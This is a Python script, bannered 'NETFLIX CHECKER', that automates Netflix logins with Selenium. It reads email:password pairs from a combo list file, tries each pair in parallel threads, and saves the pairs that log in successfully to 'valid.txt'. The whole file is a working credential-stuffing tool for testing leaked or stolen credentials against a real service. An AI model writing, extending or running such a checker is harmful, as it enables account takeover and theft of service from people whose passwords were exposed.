from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import threading
import os
from colorama import init, Fore
import sys


init(autoreset=True)

banner_text = """
                                        ███╗   ██╗███████╗████████╗███████╗██╗     ██╗██╗  ██╗  
                                        ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     ██║╚██╗██╔╝  
                                        ██╔██╗ ██║█████╗     ██║   █████╗  ██║     ██║ ╚███╔╝   
                                        ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║     ██║ ██╔██╗   
                                        ██║ ╚████║███████╗   ██║   ██║     ███████╗██║██╔╝ ██╗  
                                        ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝  
                                                                                                
                                         ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
                                        ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
                                        ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
                                        ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
                                        ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
                                         ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                
"""

os.system('cls' if os.name == 'nt' else 'clear')
print(banner_text)

def login_to_netflix(email, password):
    options = webdriver.ChromeOptions()
    options.add_argument('--log-level=3')  

    driver = webdriver.Chrome(options=options)
    driver.get("https://www.netflix.com/login")
    time.sleep(3)

    email_input = driver.find_element(By.NAME, "userLoginId")
    email_input.send_keys(email)

    password_input = driver.find_element(By.NAME, "password")
    password_input.send_keys(password)

    login_button = driver.find_element(By.CSS_SELECTOR, "button[data-uia='login-submit-button']")
    login_button.click()
    time.sleep(5)

    if driver.current_url == "https://www.netflix.com/browse":
        result_message = f'{Fore.GREEN}Valid account: {email}'
        with open('valid.txt', 'a') as valid_file:
            valid_file.write(f'{email}:{password}\n')
    else:
        result_message = f'{Fore.RED}Invalid account: {email}'

    print(result_message)

    driver.quit()

def check_accounts(lines, num_threads):
    threads = []
    for line in lines:
        login, password = line.strip().split(':')
        print(f'Tentando login com: {login}')
        thread = threading.Thread(target=login_to_netflix, args=(login, password))
        threads.append(thread)
        thread.start()
        if len(threads) >= num_threads:
            for t in threads:
                t.join()
            threads = []  

    for t in threads:
        t.join()

while True:
    try:
        speed = int(input("Choose the scan speed (1 to 5):"))
        if 1 <= speed <= 5:
            break
        else:
            print("Please choose a number between 1 and 5.")
    except ValueError:
        print("Invalid entry. Please enter a number.")

num_threads = speed

with open('combo.txt', 'r') as file:
    lines = file.readlines()

check_accounts(lines, num_threads)

# Mensagem final
print("All accounts have been verified.")
time.sleep(3)  
